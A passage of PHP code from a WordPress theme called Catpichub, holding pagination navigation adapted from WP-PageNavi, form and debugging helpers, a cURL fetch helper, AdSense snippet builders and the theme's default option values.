function is_list_odd($n, $start_zero = TRUE) {
  if( $start_zero ) 
    $n = $n + 1;

  $modulus = $n % 2;
  if( $modulus == 0 ) return FALSE;
  return TRUE;
}
}



/**
 * Adds a more advanced paging navigation to your WordPress blog
 * 
 * @author    Lester 'GaMerZ' Chan
 * @link      http://lesterchan.net/portfolio/programming/php/
 * @version   2.30
 * 
 * Copyright 2008  Lester Chan  (email : lesterchan@gmail.com)
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */
function catpichub_pagenavi($before = '', $after = '') {
  global $wpdb, $wp_query;
  
  if ( !is_single() ) {
    $request = $wp_query->request;
    $posts_per_page = intval(get_query_var('posts_per_page'));
    $paged = intval(get_query_var('paged'));
    
    $pagenavi_options = array();
    $pagenavi_options['pages_text']     = __('Page %CURRENT_PAGE% of %TOTAL_PAGES%','wp-pagenavi');
    $pagenavi_options['current_text']   = '%PAGE_NUMBER%';
    $pagenavi_options['page_text']      = '%PAGE_NUMBER%';
    $pagenavi_options['first_text']     = __('&laquo; First','wp-pagenavi');
    $pagenavi_options['last_text']      = __('Last &raquo;','wp-pagenavi');
    $pagenavi_options['next_text']      = __('&raquo;','wp-pagenavi');
    $pagenavi_options['prev_text']      = __('&laquo;','wp-pagenavi');
    $pagenavi_options['dotright_text']  = __('...','wp-pagenavi');
    $pagenavi_options['dotleft_text']   = __('...','wp-pagenavi');
    $pagenavi_options['style']          = 1;
    $pagenavi_options['num_pages']      = 5;
    $pagenavi_options['always_show']    = 0;
    
    $numposts = $wp_query->found_posts;
    $max_page = $wp_query->max_num_pages;
    /*
    $numposts = 0;
    if(strpos(get_query_var('tag'), " ")) {
        preg_match('#^(.*)\sLIMIT#siU', $request, $matches);
        $fromwhere = $matches[1];      
        $results = $wpdb->get_results($fromwhere);
        $numposts = count($results);
    } else {
      preg_match('#FROM\s*+(.+?)\s+(GROUP BY|ORDER BY)#si', $request, $matches);
      $fromwhere = $matches[1];
      $numposts = $wpdb->get_var("SELECT COUNT(DISTINCT ID) FROM $fromwhere");
    }
    $max_page = ceil($numposts/$posts_per_page);
    */
    if(empty($paged) || $paged == 0) {
      $paged = 1;
    }
    $pages_to_show = intval($pagenavi_options['num_pages']);
    $pages_to_show_minus_1 = $pages_to_show-1;
    $half_page_start = floor($pages_to_show_minus_1/2);
    $half_page_end = ceil($pages_to_show_minus_1/2);
    $start_page = $paged - $half_page_start;
    if($start_page <= 0) {
      $start_page = 1;
    }
    $end_page = $paged + $half_page_end;
    if(($end_page - $start_page) != $pages_to_show_minus_1) {
      $end_page = $start_page + $pages_to_show_minus_1;
    }
    if($end_page > $max_page) {
      $start_page = $max_page - $pages_to_show_minus_1;
      $end_page = $max_page;
    }
    if($start_page <= 0) {
      $start_page = 1;
    }
    if($max_page > 1 || intval($pagenavi_options['always_show']) == 1) {
      $pages_text = str_replace("%CURRENT_PAGE%", $paged, $pagenavi_options['pages_text']);
      $pages_text = str_replace("%TOTAL_PAGES%", $max_page, $pages_text);
      echo $before.'<div class="pagination-centered">'."\n";
      switch(intval($pagenavi_options['style'])) {
        case 1:
          echo '<ul class="pagination">';
          
          if(!empty($pages_text)) {
            //echo '<span class="pages">'.$pages_text.'</span>';
          }          
          if ($start_page >= 2 && $pages_to_show < $max_page) {
            $first_page_text = str_replace("%TOTAL_PAGES%", $max_page, $pagenavi_options['first_text']);
            echo '<li><a href="'.esc_url(get_pagenum_link()).'" title="'.$first_page_text.'">'.$first_page_text.'</a></li>';
            if(!empty($pagenavi_options['dotleft_text'])) {
              echo '<li class="extend disabled"><a>'.$pagenavi_options['dotleft_text'].'</a></li>';
            }
          }
          echo '<li>';
          previous_posts_link($pagenavi_options['prev_text']);
          echo '</li>';
          for($i = $start_page; $i  <= $end_page; $i++) {            
            if( $i == $paged ) {
              $current_page_text = str_replace("%PAGE_NUMBER%", $i, $pagenavi_options['current_text']);
              echo '<li class="current disabled"><a>'.$current_page_text.'</a></li>';
            } else {
              $page_text = str_replace("%PAGE_NUMBER%", $i, $pagenavi_options['page_text']);
              echo '<li><a href="'.esc_url(get_pagenum_link($i)).'" title="'.$page_text.'">'.$page_text.'</a></li>';
            }
          }
          echo '<li>';
          next_posts_link($pagenavi_options['next_text'], $max_page);
          echo '</li>';
          if ($end_page < $max_page) {
            if(!empty($pagenavi_options['dotright_text'])) {
              echo '<li class="extend disabled"><a>'.$pagenavi_options['dotright_text'].'</a></li>';
            }
            $last_page_text = str_replace("%TOTAL_PAGES%", $max_page, $pagenavi_options['last_text']);
            echo '<li><a href="'.esc_url(get_pagenum_link($max_page)).'" title="'.$last_page_text.'">'.$last_page_text.'</a></li>';
          }
          
          echo '</ul>';
          break;
        case 2;
          echo '<form action="'.htmlspecialchars($_SERVER['PHP_SELF']).'" method="get">'."\n";
          echo '<select size="1" onchange="document.location.href = this.options[this.selectedIndex].value;">'."\n";
          for($i = 1; $i  <= $max_page; $i++) {
            $page_num = $i;
            if($page_num == 1) {
              $page_num = 0;
            }
            if($i == $paged) {
              $current_page_text = str_replace("%PAGE_NUMBER%", $i, $pagenavi_options['current_text']);
              echo '<option value="'.esc_url(get_pagenum_link($page_num)).'" selected="selected" class="current">'.$current_page_text."</option>\n";
            } else {
              $page_text = str_replace("%PAGE_NUMBER%", $i, $pagenavi_options['page_text']);
              echo '<option value="'.esc_url(get_pagenum_link($page_num)).'">'.$page_text."</option>\n";
            }
          }
          echo "</select>\n";
          echo "</form>\n";
          break;
      }
      echo '</div>'.$after."\n";
    }
  }
}


if( ! function_exists('show_field') ) {
function show_field( $array, $key, $no_value_sign='') {
  if( isset($array[$key]) ) {
    
    if( empty( $array[$key] ) && !empty( $no_value_sign ) ) {
      echo $no_value_sign;
    
    } else {
      echo trim($array[$key]);
    }
  
  } else {
    echo '';
    
  }
}
}


if( ! function_exists('form_is_selected') ) {
function form_is_selected( $checked_value, $matched_value ) {
  if( $checked_value == $matched_value )
    echo 'selected="selected"';
}
}


if( ! function_exists('form_is_checked') ) {
function form_is_checked( $checked_value, $matched_value ) {
  if( $checked_value == $matched_value )
    echo 'checked="checked"';
}
}


if( ! function_exists('get_url_curl') ) {
function get_url_curl( $link ){

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_VERBOSE, 0);
  curl_setopt($ch, CURLOPT_ENCODING, '');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_URL, ($link));
  $response = curl_exec($ch);
  curl_close($ch);
  return ($response); 

}
}


/**
 * 'var_dump' a variable with tree structure, far better than var_dump
 *
 * @link http://www.php.net/manual/en/function.var-dump.php#80288
 * @param mixed $var
 * @param string $var_name
 * @param string $indent
 * @param string $reference
 */
if( ! function_exists('tree_dump') ) {
function tree_dump(&$var, $var_name = NULL, $indent = NULL, $reference = NULL)  {

    $tree_dump_indent = "<span style='color:#eeeeee;'>|</span> &nbsp;&nbsp; ";
    $reference = $reference.$var_name;
    $keyvar = 'the_tree_dump_recursion_protection_scheme'; $keyname = 'referenced_object_name';

    if (is_array($var) && isset($var[$keyvar]))
    {
        $real_var = &$var[$keyvar];
        $real_name = &$var[$keyname];
        $type = ucfirst(gettype($real_var));
        echo "$indent$var_name <span style='color:#a2a2a2'>$type</span> = <span style='color:#e87800;'>&amp;$real_name</span><br>";
    }
    else
    {
        $var = array($keyvar => $var, $keyname => $reference);
        $avar = &$var[$keyvar];

        $type = ucfirst(gettype($avar));
        if($type == "String") $type_color = "<span style='color:green'>";
        elseif($type == "Integer") $type_color = "<span style='color:red'>";
        elseif($type == "Double"){ $type_color = "<span style='color:#0099c5'>"; $type = "Float"; }
        elseif($type == "Boolean") $type_color = "<span style='color:#92008d'>";
        elseif($type == "NULL") $type_color = "<span style='color:black'>";

        if(is_array($avar))
        {
            $count = count($avar);
            echo "$indent" . ($var_name ? "$var_name => ":"") . "<span style='color:#a2a2a2'>$type ($count)</span><br>$indent(<br>";
            $keys = array_keys($avar);
            foreach($keys as $name)
            {
                $value = &$avar[$name];
                tree_dump($value, "['$name']", $indent.$tree_dump_indent, $reference);
            }
            echo "$indent)<br>";
        }
        elseif(is_object($avar))
        {
            echo "$indent$var_name <span style='color:#a2a2a2'>$type</span><br>$indent(<br>";
            foreach($avar as $name=>$value) tree_dump($value, "$name", $indent.$tree_dump_indent, $reference);
            echo "$indent)<br>";
        }
        elseif(is_int($avar)) echo "$indent$var_name = <span style='color:#a2a2a2'>$type(".strlen($avar).")</span> $type_color$avar</span><br>";
        elseif(is_string($avar)) echo "$indent$var_name = <span style='color:#a2a2a2'>$type(".strlen($avar).")</span> $type_color\"$avar\"</span><br>";
        elseif(is_float($avar)) echo "$indent$var_name = <span style='color:#a2a2a2'>$type(".strlen($avar).")</span> $type_color$avar</span><br>";
        elseif(is_bool($avar)) echo "$indent$var_name = <span style='color:#a2a2a2'>$type(".strlen($avar).")</span> $type_color".($avar == 1 ? "TRUE":"FALSE")."</span><br>";
        elseif(is_null($avar)) echo "$indent$var_name = <span style='color:#a2a2a2'>$type(".strlen($avar).")</span> {$type_color}NULL</span><br>";
        else echo "$indent$var_name = <span style='color:#a2a2a2'>$type(".strlen($avar).")</span> $avar<br>";

        $var = $var[$keyvar];
    }
}
}


function get_adsense_code_deprecated($width, $height) {

  if( $_SERVER['SERVER_NAME'] == 'localhost' )
    return '';

  if( ! defined('ADSENSE_ADSLOT') )
    return '';

  if( ADSENSE_ADSLOT == '' )
    return '';

  return '<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>'.
  '<!-- Murdani.Ads -->'.
  '<ins class="adsbygoogle" style="display:inline-block;width:' .$width. 'px;height:' .$height. 'px" '.
  'data-ad-client="ca-pub-' . ADSENSE_PUBID . '" data-ad-slot="'. ADSENSE_ADSLOT .'"></ins>'.
  '<script> (adsbygoogle = window.adsbygoogle || []).push({}); </script>';

}


/**
 * Retrieve AdSense code from options 
 * 
 * @param  integer $width  
 * @param  integer $height 
 * @return string  
 */
function get_adsense_code( $width, $height ) {
  
  $theme_opts = catpichub_options();
  $adkey = "adsense_{$width}x{$height}";

  if( strlen($theme_opts[$adkey]) > 10 ) 
    return stripslashes($theme_opts[$adkey]);

  return '';

}



/**
 * Load Catpichub Options
 */

/**
 * Default option values for Catpichub
 */
function catpichub_options_items() {
  $items = array (

    'adsense_728x90'        => '',
    'adsense_336x280'       => '',
    'adsense_300x600'       => '',
    'adsense_300x250'       => '',
    'adsense_728x15_link'   => '',

    'twitter_username'      => '',
    'facebook_username'     => '',
    'pinterest_username'    => '',
    'youtube_username'      => '',
    'gplus_ID'              => '',
    'fb_app_ID'             => '',
    'fb_admins_ID'          => '',
    'addthis_username'      => '',

    'enable_fb_comments'    => '',
    'enable_share_buttons'  => '',
    'enable_breadcrumbs'    => '',
    'enable_related_posts'  => '',
    'custom_favicon'        => '',
    'related_posts_type'    => 'random',
    'related_posts_amount'  => '5',
    'enable_single_gallery' => '',
    'view_default_post_thumbnail' => '',

    'adpos_home_header'           => '',
    'adpos_home_between_posts'    => '',
    'adpos_single_header'         => '',
    'adpos_single_unitlink'       => '',
    'adpos_single_post_wrap'      => '',
    'adpos_single_after_post'     => '',
    'adpos_image_header'          => '',
    'adpos_image_unitlink'        => '',
    'adpos_image_before_image'    => '',
    'adpos_image_after_image'     => '',
    'adpos_archive_header'        => '',
    'adpos_archive_between_posts' => '',
      
    'adpos_home_after_count'      => 3,
    'adpos_archive_after_count'   => 3,

  );
  return $items;
}

/**
 * Get options for this theme 
 * 
 * @return array 
 */
function catpichub_options() {

  $theme_opts = get_option('catpichub_options');
  if( !$theme_opts ) {
    $theme_opts = catpichub_options_items();
  } else {
    $theme_opts = array_merge(catpichub_options_items(), $theme_opts);
  }

  return $theme_opts;

}

/** Load options. Ready for global access. */
$theme_opts = catpichub_options();

require_once get_template_directory() . '/includes/admin-pages.php';
